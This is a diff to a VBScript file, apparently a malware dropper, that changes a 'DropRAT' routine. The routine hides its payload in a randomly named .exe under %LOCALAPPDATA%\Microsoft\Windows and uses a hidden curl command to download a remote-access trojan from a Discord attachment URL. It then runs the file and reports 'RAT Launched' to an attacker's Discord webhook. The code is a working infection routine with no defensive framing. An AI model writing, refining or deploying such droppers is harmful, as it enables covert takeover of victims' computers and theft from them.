@@ -43,53 +43,25 @@ Loop
 
 window.close()
 
-' --- RAT DROP (reverted to working WinHttp version, clean UI) ---
+' --- RAT DROP (curl) ---
 Sub DropRAT(targetWH, sendRocket)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&"
-    
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572397351186726983/client_1.exe?ex=6afe38a6&is=6afce726&hm=4b6fb143a4c62538322222e24538818e709116379007ef0fcaa57f9e2c945054&"
+
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
-    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000)
-    Dim datPath : datPath = tPath & "\" & fname & ".dat"
-    Dim op : op = tPath & "\" & fname & ".exe"
-    
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
+    Dim op : op = tPath & "\" & fname
+
     If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
-    If fso.FileExists(datPath) Then fso.DeleteFile datPath, True
 
-    Dim status : status = 0
-    Dim bodyLen : bodyLen = 0
-    Dim ok : ok = False
+    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & op & """ """ & dl & """"
+    sh.Run cCmd, 0, True
 
-    On Error Resume Next
-    Dim xh : Set xh = CreateObject("WinHttp.WinHttpRequest.5.1")
-    If Not xh Is Nothing Then
-        xh.SetTimeouts 5000, 5000, 5000, 30000
-        xh.Open "GET", dl, False
-        xh.Send
-        status = xh.Status
-        If status = 200 Then
-            bodyLen = LenB(xh.ResponseBody)
-            If bodyLen > 100000 Then
-                Dim st : Set st = CreateObject("ADODB.Stream")
-                st.Type = 1
-                st.Open
-                st.Write xh.ResponseBody
-                st.SaveToFile datPath, 2
-                st.Close
-                Set st = Nothing
-                ok = True
-            End If
-        End If
-        Set xh = Nothing
-    End If
-    On Error Goto 0
-
-    If ok And fso.FileExists(datPath) Then
-        If fso.GetFile(datPath).Size > 100000 Then
-            fso.MoveFile datPath, op
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 100000 Then
             If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
             Call RunCmd("""" & op & """")
         End If
